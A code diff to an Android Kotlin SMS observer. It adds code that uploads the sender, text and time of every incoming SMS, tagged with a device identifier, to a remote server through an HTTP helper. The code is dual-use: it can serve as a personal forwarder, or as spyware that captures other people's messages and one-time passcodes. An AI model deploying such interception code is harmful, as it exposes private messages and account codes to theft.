@@ -7,6 +7,12 @@ import android.os.Handler
 import android.os.Looper
 import android.util.Log
 import android.widget.Toast
+import com.example.Mmkv
+import com.example.http.HttpManager
+import java.time.Instant
+import java.time.LocalDateTime
+import java.time.ZoneId
+import java.time.format.DateTimeFormatter
 
 class SmsObserver(val context: Context,handler: Handler): ContentObserver(handler) {
     companion object{
@@ -52,7 +58,18 @@ class SmsObserver(val context: Context,handler: Handler): ContentObserver(handle
             val status = cur.getInt(cur.getColumnIndex("status"))
             val date = cur.getLong(cur.getColumnIndex("date"))
             val thread = cur.getInt(cur.getColumnIndex("thread_id"))
+            val msg = "${Mmkv.dd_tag} 于 ${timeFormatter(date)} 收到 $phone 的短信\n内容: $body"
+            HttpManager.upload(msg)
             Toast.makeText(context, "检测到短信插入:${phone}-${body}", Toast.LENGTH_SHORT).show()
         }
     }
+    fun timeFormatter(timestamp:Long):String{
+        val localDateTime = LocalDateTime.ofInstant(Instant.ofEpochMilli(timestamp), ZoneId.systemDefault())
+        val formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")
+
+        // 将 LocalDateTime 转换为字符串
+        val formattedDateTime = localDateTime.format(formatter)
+        return formattedDateTime
+    }
+
 }
